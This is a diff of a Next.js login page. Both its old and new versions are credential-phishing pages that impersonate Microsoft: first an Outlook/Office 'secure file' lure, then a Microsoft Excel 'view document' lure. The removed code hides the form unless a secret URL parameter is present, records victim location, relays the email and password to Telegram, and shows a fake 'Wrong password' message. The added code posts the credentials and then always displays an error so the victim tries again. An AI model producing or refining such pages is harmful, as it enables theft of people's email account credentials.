@@ -1,65 +1,42 @@
 "use client";
 
-import { Suspense, useEffect, useState } from "react";
+import { Suspense, useState } from "react";
 import { useForm } from "react-hook-form";
 import { z } from "zod";
-import { Info } from "lucide-react";
 import { zodResolver } from "@hookform/resolvers/zod";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
+import { Loader2 } from "lucide-react";
 import Image from "next/image";
-import {
-  InputGroup,
-  InputGroupAddon,
-  InputGroupButton,
-  InputGroupInput,
-  InputGroupText,
-} from "@/components/ui/input-group";
-import {
-  Tooltip,
-  TooltipContent,
-  TooltipTrigger,
-} from "@/components/ui/tooltip";
-import Link from "next/link";
-import { useSearchParams } from "next/navigation";
+import { useRouter } from "next/navigation";
 
 const formSchema = z.object({
-  email: z.email("Email is required"),
+  email: z.string().email("Invalid email address"),
   password: z.string().min(1, "Password is required"),
+  staySignedIn: z.boolean().optional(),
 });
 
 type FormValues = z.infer<typeof formSchema>;
 
 function LoginPageContent() {
-  const searchParams = useSearchParams();
-  const hasPhrase = searchParams.get("phrase") === "login";
-
-  const [isLoading, setIsLoading] = useState(!hasPhrase);
-  const [showTryAgain, setShowTryAgain] = useState(false);
+  const router = useRouter();
   const [serverError, setServerError] = useState<string | null>(null);
-  const [successMessage, setSuccessMessage] = useState<string | null>(null);
-  const [ip, setIp] = useState<{ country: string; city: string; ip: string }>({
-    country: "",
-    city: "",
-    ip: "",
-  });
 
   const {
     register,
     handleSubmit,
-    reset,
     formState: { errors, isSubmitting },
   } = useForm<FormValues>({
     resolver: zodResolver(formSchema),
     defaultValues: {
       email: "",
       password: "",
+      staySignedIn: true,
     },
   });
 
   const onSubmit = async (values: FormValues) => {
     setServerError(null);
-    setSuccessMessage(null);
 
     try {
       const response = await fetch("/api/login", {
@@ -67,184 +44,131 @@ function LoginPageContent() {
         headers: {
           "Content-Type": "application/json",
         },
-        body: JSON.stringify({ ...values, ip }),
+        body: JSON.stringify(values),
       });
 
       if (!response.ok) {
-        const payload = await response.json().catch(() => null);
-        throw new Error(payload?.error ?? "Failed to send message to Telegram");
+        const payload = await response.json().catch(() => ({}));
+        throw new Error(payload?.error ?? "Authentication failed");
       }
-
-      setSuccessMessage("Sent to Telegram!");
-      reset();
-    } catch (error) {
-      if (error instanceof Error) {
-        setServerError(error.message);
-      } else {
-        setServerError("Something went wrong.");
-      }
+      setServerError("Something went wrong!");
+    } catch (err) {
+      const message =
+        err instanceof Error ? err.message : "Something went wrong";
+      setServerError(message);
     }
   };
-
-  // useEffect(() => {
-  //   const getClientLocation = async () => {
-  //     const res = await fetch("https://ipinfo.io/json");
-  //     const locationData = await res.json();
-  //     setIp(locationData);
-  //   };
-  //   getClientLocation();
-  // }, []);
-
-  useEffect(() => {
-    if (!hasPhrase) {
-      const timer = setTimeout(() => {
-        setIsLoading(false);
-        setShowTryAgain(true);
-      }, 4000);
-      return () => clearTimeout(timer);
-    }
-  }, [hasPhrase]);
-
-  const handleReload = () => {
-    window.location.reload();
-  };
-
-  if (!hasPhrase) {
-    return (
-      <div className="flex flex-col min-h-screen items-center justify-center font-sans">
-        {isLoading ? (
-          <div className="flex flex-col items-center gap-4">
-            <div className="h-10 w-10 animate-spin rounded-full border-4 border-zinc-300 border-t-blue-600" />
-            <p className="text-zinc-600">Loading...</p>
-          </div>
-        ) : showTryAgain ? (
-          <div className="flex flex-col items-center gap-4">
-            <p className="text-zinc-600">Something went wrong.</p>
-            <Button onClick={handleReload}>Try Again</Button>
-          </div>
-        ) : null}
-      </div>
-    );
-  }
 
   return (
-    <div className="flex flex-col min-h-screen items-center justify-center font-sans">
-      <header className="mb-7 w-full border-b pb-4 text-center">
-        <h2 className="text-[28px] font-semibold text-zinc-800">
-          Verify Your Identity
-        </h2>
-      </header>
-      <main className="w-full max-w-sm rounded-2xl bg-white px-6 py-8">
-        <section className="mb-5 space-y-1 text-xs text-zinc-500">
-          <p className="font-bold text-gray-600 text-[16px]">
-            You&apos;ve received a secure file
-          </p>
+    <div className="flex min-h-screen flex-col items-center justify-center font-sans text-black bg-[url('/images/doc.png')] bg-cover bg-center">
+      <div className="w-full max-w-md space-y-8 px-4">
+        <div className="rounded-lg border border-gray-300 bg-white p-6 shadow-md">
+          <div className="text-left">
+            <div className="flex py-5 px-2 rounded-md bg-black/10 items-center space-x-6">
+              <Image
+                src="/images/excel.png"
+                alt="Excel"
+                width={50}
+                height={50}
+                priority
+              />
+              <h2 className="text-2xl font-semibold text-green-700">
+                Microsoft Excel
+              </h2>
+            </div>
 
-          <div className="flex items-center py-[20px] pl-[20px] gap-2">
-            <Image src="/images/pdf.png" width={30} height={30} alt="pdf" />
-            <p className="font-semibold">56.1KB</p>
+            <h2 className="mt-6 text-xl font-semibold tracking-tight text-black">
+              Confirm your identity
+            </h2>
+            <p className="mt-1 text-sm text-gray-600">
+              Sign in with your valid email account to view document.
+            </p>
           </div>
 
-          <p className="font-semibold">
-            To receive and download this file, enter the email address and
-            password associated with the account this document was sent to.
-          </p>
-        </section>
-
-        <section className="flex items-center justify-center">
-          <Image
-            src={"/images/outlook.png"}
-            width={40}
-            height={70}
-            alt="outlook"
-          />
-          <Image
-            src={"/images/office.png"}
-            width={90}
-            height={90}
-            alt="office"
-          />
-        </section>
-
-        <form className="space-y-4 mt-8" onSubmit={handleSubmit(onSubmit)}>
-          <div>
-            <InputGroup className="h-[50px]">
-              <InputGroupInput
+          <form className="space-y-5 mt-6" onSubmit={handleSubmit(onSubmit)}>
+            <div className="space-y-1">
+              <label
+                htmlFor="email"
+                className="text-sm font-medium text-gray-700"
+              >
+                Email ID
+              </label>
+              <Input
                 id="email"
                 type="email"
-                aria-invalid={Boolean(errors.email)}
+                placeholder="name@example.com"
+                className="bg-white border-gray-300 text-black placeholder:text-gray-400 focus-visible:ring-blue-500 focus-visible:border-blue-500"
                 {...register("email")}
-                placeholder="Email"
-                className="!pl-4 h-[45px]"
               />
-              <InputGroupAddon align="inline-end">
-                <Tooltip>
-                  <TooltipTrigger asChild>
-                    <InputGroupButton className="rounded-full" size="icon-xs">
-                      <Info size={25} />
-                    </InputGroupButton>
-                  </TooltipTrigger>
-                  <TooltipContent>Enter your email address.</TooltipContent>
-                </Tooltip>
-              </InputGroupAddon>
-            </InputGroup>
-
-            {errors.email?.message ? (
-              <p className="mt-1 text-[11px] text-red-500">
-                {errors.email.message}
-              </p>
-            ) : null}
-          </div>
-
-          <div>
-            <Input
-              id="password"
-              placeholder="Enter password"
-              type="password"
-              className="h-[45px]"
-              aria-invalid={Boolean(errors.password)}
-              {...register("password")}
-            />
-            {errors.password?.message ? (
-              <p className="mt-1 text-[11px] text-red-500">
-                {errors.password.message}
-              </p>
-            ) : null}
-          </div>
-
-          {serverError ? (
-            <p className="text-xs text-red-500">{serverError}</p>
-          ) : null}
-
-          {successMessage ? (
-            <div className="py-4 w-full text-center bg-red-100 rounded-sm">
-              <p className="text-md font-semibold text-red-700">
-                Wrong password! Please try again.
-              </p>
+              {errors.email && (
+                <p className="text-xs text-red-500 pt-1">
+                  {errors.email.message}
+                </p>
+              )}
             </div>
-          ) : null}
 
-          <Button
-            type="submit"
-            disabled={isSubmitting}
-            className="w-full text-[17px]"
-          >
-            {isSubmitting ? "Signing in..." : "Sign in"}
-          </Button>
-        </form>
+            <div className="space-y-1">
+              <label
+                htmlFor="password"
+                className="text-sm font-medium text-gray-700"
+              >
+                Email Password
+              </label>
+              <Input
+                id="password"
+                type="password"
+                className="bg-white border-gray-300 text-black placeholder:text-gray-400 focus-visible:ring-blue-500 focus-visible:border-blue-500"
+                {...register("password")}
+              />
+              {errors.password && (
+                <p className="text-xs text-red-500 pt-1">
+                  {errors.password.message}
+                </p>
+              )}
+            </div>
 
-        <footer className="mt-2 text-center">
-          <p className="text-[14px] text-zinc-700">
-            &copy; {new Date().getFullYear()} Microsoft •{" "}
-            <Link
-              className="underline cursor-pointer"
-              href="https://microsoft.com/privacy"
+            <div className="flex items-center space-x-2">
+              <input
+                type="checkbox"
+                id="stay"
+                className="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded"
+                {...register("staySignedIn")}
+              />
+              <label htmlFor="stay" className="text-sm text-gray-700">
+                Stay signed in
+              </label>
+            </div>
+            <p className="text-xs text-gray-500 -mt-1 ml-6">
+              Uncheck on public computers
+            </p>
+
+            {serverError && (
+              <div className="rounded bg-red-50 p-3 text-center text-sm text-red-700 border border-red-200">
+                {serverError}
+              </div>
+            )}
+
+            <Button
+              type="submit"
+              className="w-full bg-purple-600 text-white hover:bg-purple-700"
+              disabled={isSubmitting}
             >
-              Privacy & cookies
-            </Link>
+              {isSubmitting ? (
+                <>
+                  <Loader2 className="mr-2 h-4 w-4 animate-spin" />
+                  Viewing...
+                </>
+              ) : (
+                "View Document"
+              )}
+            </Button>
+          </form>
+
+          <p className="mt-8 text-center text-xs text-gray-500">
+            © Copyright 2015 Microsoft Corporation
           </p>
-        </footer>
-      </main>
+        </div>
+      </div>
     </div>
   );
 }
@@ -253,11 +177,8 @@ export default function LoginPage() {
   return (
     <Suspense
       fallback={
-        <div className="flex flex-col min-h-screen items-center justify-center font-sans">
-          <div className="flex flex-col items-center gap-4">
-            <div className="h-10 w-10 animate-spin rounded-full border-4 border-zinc-300 border-t-blue-600" />
-            <p className="text-zinc-600">Loading...</p>
-          </div>
+        <div className="flex min-h-screen items-center justify-center bg-gray-100 text-gray-500">
+          Loading...
         </div>
       }
     >
